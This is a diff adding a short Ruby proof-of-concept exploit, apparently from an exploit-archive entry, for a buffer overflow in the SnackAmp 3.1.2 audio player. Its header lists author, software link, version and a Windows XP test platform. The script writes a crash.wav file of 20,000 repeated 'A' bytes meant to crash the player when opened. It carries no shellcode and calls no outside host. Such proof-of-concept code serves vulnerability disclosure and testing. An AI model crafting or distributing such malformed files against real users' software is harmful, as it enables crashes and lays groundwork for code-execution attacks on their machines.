@@ -1,0 +1,15 @@
+# Exploit Title: SnackAmp 3.1.2 Malicious WAV Buffer Overflow Vulnerability (POC)
+# Date: 08/28/10
+# Author: james [AT] learnsecurityonline [DOT] com
+# Software Link: http://sourceforge.net/projects/snackamp/
+# Version: 3.1.2
+# Tested on: Windows XP SP3 EN
+# CVE: N/A
+
+#! /usr/bin/env ruby
+
+junk = "\x41" * 20000
+
+File.open("crash.wav", 'w') do |b|
+	b.write junk
+end
